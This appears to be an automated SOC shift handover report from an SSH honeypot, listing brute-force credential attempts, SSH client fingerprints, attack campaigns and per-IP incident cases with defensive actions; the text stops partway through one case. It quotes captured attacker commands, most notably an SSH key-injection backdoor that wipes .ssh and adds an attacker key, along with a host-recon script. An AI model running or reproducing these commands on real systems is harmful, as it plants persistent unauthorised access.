# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-24 |
| **Generated At** | 2026-07-24T06:30:57Z |
| **Shift Time** | 06:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **226** |
| Confirmed Threats | **177** |
| False Positives Filtered | **49** (21.7%) |
| Unique Attacker IPs | **92** |
| Countries of Origin | **30** |
| High Severity Cases | **132** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **94** |
| Malware Samples Analyzed | **3** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **153** |
| Unique Credential Pairs | **103** |
| Unique Usernames | **43** |
| Unique Passwords | **88** |
| Successful Auth Pairs | **146** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 53 |
| `debian` | 10 |
| `user` | 8 |
| `oracle` | 8 |
| `admin` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 6 |
| `666666` | 6 |
| `qwerty12` | 6 |
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `debian` | `666666` | 6 |
| `oracle` | `qwerty12` | 6 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `blank` | `33` | 4 |
| `debian` | `debian2008` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `administrator` | `1234567890` | `218.206.136.24` | 2026-07-24T02:57:51 |
| `administrator` | `1234567890` | `188.43.204.45` | 2026-07-24T02:57:58 |
| `supervisor` | `supervisor2024` | `179.184.85.167` | 2026-07-24T02:58:09 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.67.136` | 2026-07-24T03:02:25 |
| `*1` | `$4` | `34.77.67.136` | 2026-07-24T03:02:39 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5324` | `34.77.67.136` | 2026-07-24T03:02:41 |
| `root` | `!root` | `92.118.39.71` | 2026-07-24T03:04:07 |
| `root` | `111111` | `92.118.39.71` | 2026-07-24T03:06:07 |
| `root` | `123123` | `92.118.39.71` | 2026-07-24T03:08:10 |
| `admin` | `555` | `10.0.0.73` | 2026-07-24T03:08:27 |
| `root` | `123321` | `92.118.39.71` | 2026-07-24T03:10:15 |
| `root` | `1234` | `92.118.39.71` | 2026-07-24T03:12:21 |
| `user` | `user2000` | `113.193.187.154` | 2026-07-24T03:12:32 |
| `ida` | `123456` | `24.122.136.94` | 2026-07-24T03:14:16 |
| `345gs5662d34` | `345gs5662d34` | `24.122.136.94` | 2026-07-24T03:14:17 |
| `ida` | `3245gs5662d34` | `24.122.136.94` | 2026-07-24T03:14:17 |
| `root` | `12345` | `92.118.39.71` | 2026-07-24T03:14:26 |
| `user` | `user2000` | `10.0.0.73` | 2026-07-24T03:16:06 |
| `ftp_test` | `ftp_test` | `101.32.145.199` | 2026-07-24T03:16:41 |
| `345gs5662d34` | `345gs5662d34` | `101.32.145.199` | 2026-07-24T03:16:45 |
| `ftp_test` | `3245gs5662d34` | `101.32.145.199` | 2026-07-24T03:16:47 |
| `root` | `1234567` | `92.118.39.71` | 2026-07-24T03:18:24 |
| `debian` | `666666` | `103.121.27.218` | 2026-07-24T03:18:55 |
| `blank` | `888888` | `24.142.170.231` | 2026-07-24T03:19:02 |
| `debian` | `666666` | `196.189.59.226` | 2026-07-24T03:19:04 |
| `blank` | `888888` | `58.56.128.190` | 2026-07-24T03:19:15 |
| `khan` | `khan` | `77.105.130.18` | 2026-07-24T03:19:57 |
| `345gs5662d34` | `345gs5662d34` | `77.105.130.18` | 2026-07-24T03:19:59 |
| `khan` | `3245gs5662d34` | `77.105.130.18` | 2026-07-24T03:20:00 |
| `root` | `12345678` | `92.118.39.71` | 2026-07-24T03:20:17 |
| `root` | `123456789` | `92.118.39.71` | 2026-07-24T03:22:09 |
| `debian` | `666666` | `213.130.207.177` | 2026-07-24T03:22:13 |
| `debian` | `666666` | `180.76.52.146` | 2026-07-24T03:22:21 |
| `debian` | `666666` | `10.0.0.73` | 2026-07-24T03:22:36 |
| `root` | `1234567890` | `92.118.39.71` | 2026-07-24T03:24:06 |
| `root` | `123456a` | `92.118.39.71` | 2026-07-24T03:26:15 |
| `testing` | `123456` | `112.197.2.116` | 2026-07-24T03:27:53 |
| `root` | `123456b` | `92.118.39.71` | 2026-07-24T03:28:23 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-24T03:29:00 |
| `config` | `88` | `220.189.253.198` | 2026-07-24T03:29:08 |
| `root` | `1234abcd` | `92.118.39.71` | 2026-07-24T03:30:23 |
| `root` | `123abc` | `92.118.39.71` | 2026-07-24T03:32:20 |
| `config` | `88` | `46.201.247.21` | 2026-07-24T03:32:31 |
| `root` | `---fuck_you----` | `182.92.236.135` | 2026-07-24T03:33:22 |
| `root` | `123qwe` | `92.118.39.71` | 2026-07-24T03:34:18 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-07-24T03:36:10 |
| `root` | `1qaz2wsx` | `92.118.39.71` | 2026-07-24T03:38:02 |
| `root` | `root2018` | `213.154.80.51` | 2026-07-24T03:38:36 |
| `root` | `1qaz@WSX` | `92.118.39.71` | 2026-07-24T03:39:56 |
| `admin` | `admin` | `34.140.11.164` | 2026-07-24T03:40:13 |
| `root` | `21` | `92.118.39.71` | 2026-07-24T03:41:45 |
| `blank` | `33` | `203.192.211.180` | 2026-07-24T03:43:11 |
| `root` | `321` | `92.118.39.71` | 2026-07-24T03:43:34 |
| `root` | `4321` | `92.118.39.71` | 2026-07-24T03:45:27 |
| `oracle` | `password321` | `125.139.124.120` | 2026-07-24T03:46:35 |
| `blank` | `33` | `118.122.196.230` | 2026-07-24T03:46:40 |
| `oracle` | `password321` | `10.0.0.73` | 2026-07-24T03:46:53 |
| `blank` | `33` | `10.0.0.73` | 2026-07-24T03:46:57 |
| `root` | `54321` | `92.118.39.71` | 2026-07-24T03:47:28 |
| `root` | `555555` | `92.118.39.71` | 2026-07-24T03:49:40 |
| `root` | `654321` | `92.118.39.71` | 2026-07-24T03:52:00 |
| `admin` | `admin777` | `103.31.39.188` | 2026-07-24T03:53:31 |
| `root` | `7777777` | `92.118.39.71` | 2026-07-24T03:54:11 |
| `root` | `Admin2026!` | `92.118.39.71` | 2026-07-24T03:55:59 |
| `root` | `admin` | `130.12.180.174` | 2026-07-24T03:56:42 |
| `admin` | `admin777` | `36.154.134.146` | 2026-07-24T03:57:00 |
| `admin` | `admin777` | `10.0.0.73` | 2026-07-24T03:57:27 |
| `root` | `P4ssw0rd` | `92.118.39.71` | 2026-07-24T03:57:43 |
| `root` | `root2013` | `120.194.50.39` | 2026-07-24T03:58:27 |
| `root` | `root2013` | `181.212.174.166` | 2026-07-24T03:58:35 |
| `root` | `P4ssword` | `92.118.39.71` | 2026-07-24T03:59:27 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-07-24T04:01:18 |
| `root` | `P@ssw0rd2026` | `92.118.39.71` | 2026-07-24T04:03:14 |
| `root` | `P@ssword` | `92.118.39.71` | 2026-07-24T04:05:13 |
| `eth-docker` | `eth-docker` | `45.148.10.240` | 2026-07-24T04:06:29 |
| `root` | `Passw0rd` | `92.118.39.71` | 2026-07-24T04:07:24 |
| `test` | `8888888` | `61.184.128.210` | 2026-07-24T04:07:38 |
| `oracle` | `qwerty12` | `49.124.152.254` | 2026-07-24T04:07:40 |
| `oracle` | `qwerty12` | `188.43.204.45` | 2026-07-24T04:07:51 |
| `ethdocker` | `ethdocker` | `45.148.10.240` | 2026-07-24T04:08:16 |
| `sol` | `sol` | `45.148.10.240` | 2026-07-24T04:10:00 |
| `oracle` | `qwerty12` | `72.24.210.58` | 2026-07-24T04:11:01 |
| `test` | `8888888` | `106.112.194.160` | 2026-07-24T04:11:05 |
| `oracle` | `qwerty12` | `31.41.84.98` | 2026-07-24T04:11:06 |
| `test` | `8888888` | `186.103.136.43` | 2026-07-24T04:11:14 |
| `oracle` | `qwerty12` | `10.0.0.73` | 2026-07-24T04:11:24 |
| `sol` | `1234` | `45.148.10.240` | 2026-07-24T04:11:36 |
| `sol` | `123` | `45.148.10.240` | 2026-07-24T04:13:12 |
| `sol` | `Solana` | `45.148.10.240` | 2026-07-24T04:14:52 |
| `sol` | `solana` | `45.148.10.240` | 2026-07-24T04:16:31 |
| `solana` | `solana` | `45.148.10.240` | 2026-07-24T04:18:05 |
| `solv` | `123456` | `45.148.10.240` | 2026-07-24T04:19:45 |
| `support` | `support` | `176.53.159.196` | 2026-07-24T04:20:48 |
| `solv` | `12345678` | `45.148.10.240` | 2026-07-24T04:21:33 |
| `ubnt` | `77` | `220.246.43.109` | 2026-07-24T04:21:35 |
| `ubnt` | `77` | `10.0.0.73` | 2026-07-24T04:22:03 |
| `support` | `support` | `10.0.0.73` | 2026-07-24T04:22:06 |
| `hummingbot` | `hummingbot` | `45.148.10.240` | 2026-07-24T04:23:16 |
| `supervisor` | `supervisor2005` | `111.70.32.50` | 2026-07-24T04:24:50 |
| `freqtrade` | `freqtrade` | `45.148.10.240` | 2026-07-24T04:24:57 |
| `supervisor` | `supervisor2005` | `10.0.0.73` | 2026-07-24T04:24:59 |
| `ollama` | `ollama` | `45.148.10.240` | 2026-07-24T04:26:39 |
| `jito` | `jito` | `45.148.10.240` | 2026-07-24T04:28:20 |
| `root` | `123` | `193.32.162.84` | 2026-07-24T04:29:27 |
| `tensorflow` | `tensorflow` | `45.148.10.240` | 2026-07-24T04:29:56 |
| `tensor` | `tensor` | `45.148.10.240` | 2026-07-24T04:31:33 |
| `root` | `admin` | `94.154.43.195` | 2026-07-24T04:31:48 |
| `root` | `1234` | `193.32.162.84` | 2026-07-24T04:31:54 |
| `guest` | `33333` | `112.120.115.152` | 2026-07-24T04:32:00 |
| `guest` | `33333` | `124.167.20.72` | 2026-07-24T04:32:09 |
| `user` | `1` | `45.148.10.240` | 2026-07-24T04:33:17 |
| `root` | `12345` | `193.32.162.84` | 2026-07-24T04:34:08 |
| `user` | `123456` | `45.148.10.240` | 2026-07-24T04:35:03 |
| `guest` | `33333` | `176.172.239.193` | 2026-07-24T04:35:16 |
| `Support` | `qwerty1` | `10.0.0.73` | 2026-07-24T04:35:52 |
| `user1` | `user1` | `45.148.10.240` | 2026-07-24T04:36:47 |
| `john` | `john` | `45.148.10.240` | 2026-07-24T04:38:30 |
| `root` | `1234567` | `193.32.162.84` | 2026-07-24T04:38:44 |
| `bonito` | `bonito` | `45.148.10.240` | 2026-07-24T04:40:13 |
| `root` | `12345678` | `193.32.162.84` | 2026-07-24T04:41:16 |
| `nemo` | `nemo` | `45.148.10.240` | 2026-07-24T04:41:53 |
| `user` | `555555` | `119.207.3.114` | 2026-07-24T04:42:45 |
| `user` | `555555` | `114.98.63.18` | 2026-07-24T04:42:55 |
| `artemis` | `artemis` | `45.148.10.240` | 2026-07-24T04:43:29 |
| `root` | `123456789` | `193.32.162.84` | 2026-07-24T04:43:39 |
| `debian` | `debian2008` | `31.41.84.98` | 2026-07-24T04:44:20 |
| `debian` | `debian2008` | `211.43.139.142` | 2026-07-24T04:44:28 |
| `asterisk` | `asterisk` | `45.148.10.240` | 2026-07-24T04:45:09 |
| `xiao` | `xiao123` | `45.192.198.32` | 2026-07-24T04:45:55 |
| `345gs5662d34` | `345gs5662d34` | `45.192.198.32` | 2026-07-24T04:45:59 |
| `xiao` | `3245gs5662d34` | `45.192.198.32` | 2026-07-24T04:46:01 |
| `root` | `1234567890` | `193.32.162.84` | 2026-07-24T04:46:11 |
| `user` | `555555` | `10.0.0.73` | 2026-07-24T04:46:26 |
| `grid` | `grid` | `45.148.10.240` | 2026-07-24T04:46:56 |
| `debian` | `debian2008` | `111.70.32.8` | 2026-07-24T04:47:36 |
| `debian` | `debian2008` | `10.0.0.73` | 2026-07-24T04:47:57 |
| `root` | `0216` | `119.156.28.157` | 2026-07-24T04:48:25 |
| `root` | `123abc` | `193.32.162.84` | 2026-07-24T04:48:29 |
| `345gs5662d34` | `345gs5662d34` | `119.156.28.157` | 2026-07-24T04:48:31 |
| `root` | `3245gs5662d34` | `119.156.28.157` | 2026-07-24T04:48:32 |
| `erp` | `erp` | `45.148.10.240` | 2026-07-24T04:48:40 |
| `erp` | `erp@123` | `45.148.10.240` | 2026-07-24T04:50:24 |
| `root` | `1q2w3e4r` | `193.32.162.84` | 2026-07-24T04:50:36 |
| `frappe` | `frappe@123` | `45.148.10.240` | 2026-07-24T04:52:09 |
| `root` | `P@ssw0rd123` | `193.32.162.84` | 2026-07-24T04:52:50 |
| `frappe` | `frappe123` | `45.148.10.240` | 2026-07-24T04:53:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **226** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 78 |
| OpenSSH | 39 |
| libssh | 21 |
| Unknown | 1 |
| Nmap scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 44 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 39 | 37 |
| `16443846184e...` | Generic scanner | 30 | 2 |
| `f555226df196...` | Mirai/variant | 15 | 5 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 44 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 39 | 37 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 30 | 2 | Generic scanner |
| `f555226df196...` | libssh | 15 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 42 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`, `193.32.162.84`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.192.198.32`, `101.32.145.199`, `119.156.28.157`, `77.105.130.18`, `24.122.136.94`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **92** |
| Unique ASNs | **54** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 8 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS17421` | Mobile Business Group | 4 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS56046` | China Mobile communications corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (132)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ec0825cc9341

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-07-24 02:57 |
| **Last Seen** | 2026-07-24 02:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 02:57:48` | `cowrie.session.connect` |
| `2026-07-24 02:57:49` | `cowrie.client.version` |
| `2026-07-24 02:57:49` | `cowrie.client.kex` |
| `2026-07-24 02:57:51` | `cowrie.login.success` |
| `2026-07-24 02:57:52` | `cowrie.direct-tcpip.request` |
| `2026-07-24 02:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8737442f13c1

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-07-24 02:57 |
| **Last Seen** | 2026-07-24 03:02 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 02:57:57` | `cowrie.session.connect` |
| `2026-07-24 02:57:57` | `cowrie.client.version` |
| `2026-07-24 02:57:57` | `cowrie.client.kex` |
| `2026-07-24 02:57:58` | `cowrie.login.success` |
| `2026-07-24 03:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd5f7b428c88

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-07-24 02:58 |
| **Last Seen** | 2026-07-24 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 02:58:06` | `cowrie.session.connect` |
| `2026-07-24 02:58:07` | `cowrie.client.version` |
| `2026-07-24 02:58:07` | `cowrie.client.kex` |
| `2026-07-24 02:58:09` | `cowrie.login.success` |
| `2026-07-24 02:58:10` | `cowrie.direct-tcpip.request` |
| `2026-07-24 02:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083ab571dd2f

| Field | Detail |
|---|---|
| **Source IP** | `34.77.67[.]136` |
| **First Seen** | 2026-07-24 03:02 |
| **Last Seen** | 2026-07-24 03:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:02:25` | `cowrie.session.connect` |
| `2026-07-24 03:02:25` | `cowrie.login.success` |
| `2026-07-24 03:02:26` | `cowrie.session.params` |
| `2026-07-24 03:02:26` | `cowrie.command.input` |
| `2026-07-24 03:02:26` | `cowrie.command.input` |
| `2026-07-24 03:02:26` | `cowrie.command.failed` |
| `2026-07-24 03:02:26` | `cowrie.command.input` |
| `2026-07-24 03:02:26` | `cowrie.log.closed` |
| `2026-07-24 03:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.67[.]136` to AbuseIPDB if not already reported
- [ ] Block `34.77.67[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f08973ae9095

| Field | Detail |
|---|---|
| **Source IP** | `34.77.67[.]136` |
| **First Seen** | 2026-07-24 03:02 |
| **Last Seen** | 2026-07-24 03:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:02:39` | `cowrie.session.connect` |
| `2026-07-24 03:02:39` | `cowrie.login.success` |
| `2026-07-24 03:02:39` | `cowrie.session.params` |
| `2026-07-24 03:02:39` | `cowrie.command.input` |
| `2026-07-24 03:02:39` | `cowrie.command.failed` |
| `2026-07-24 03:02:44` | `cowrie.log.closed` |
| `2026-07-24 03:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.67[.]136` to AbuseIPDB if not already reported
- [ ] Block `34.77.67[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37db89d20f8d

| Field | Detail |
|---|---|
| **Source IP** | `34.77.67[.]136` |
| **First Seen** | 2026-07-24 03:02 |
| **Last Seen** | 2026-07-24 03:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:02:41` | `cowrie.session.connect` |
| `2026-07-24 03:02:41` | `cowrie.login.success` |
| `2026-07-24 03:02:41` | `cowrie.session.params` |
| `2026-07-24 03:02:41` | `cowrie.command.input` |
| `2026-07-24 03:02:44` | `cowrie.log.closed` |
| `2026-07-24 03:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.67[.]136` to AbuseIPDB if not already reported
- [ ] Block `34.77.67[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c3d2cc7e5f2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:04 |
| **Last Seen** | 2026-07-24 03:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:04:04` | `cowrie.session.connect` |
| `2026-07-24 03:04:04` | `cowrie.client.version` |
| `2026-07-24 03:04:04` | `cowrie.client.kex` |
| `2026-07-24 03:04:07` | `cowrie.login.success` |
| `2026-07-24 03:04:09` | `cowrie.session.params` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.success` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:09` | `cowrie.command.input` |
| `2026-07-24 03:04:10` | `cowrie.log.closed` |
| `2026-07-24 03:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5672715aacf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:06 |
| **Last Seen** | 2026-07-24 03:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:06:04` | `cowrie.session.connect` |
| `2026-07-24 03:06:05` | `cowrie.client.version` |
| `2026-07-24 03:06:05` | `cowrie.client.kex` |
| `2026-07-24 03:06:07` | `cowrie.login.success` |
| `2026-07-24 03:06:09` | `cowrie.session.params` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.success` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.command.input` |
| `2026-07-24 03:06:09` | `cowrie.log.closed` |
| `2026-07-24 03:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0005ce1771d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:08 |
| **Last Seen** | 2026-07-24 03:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
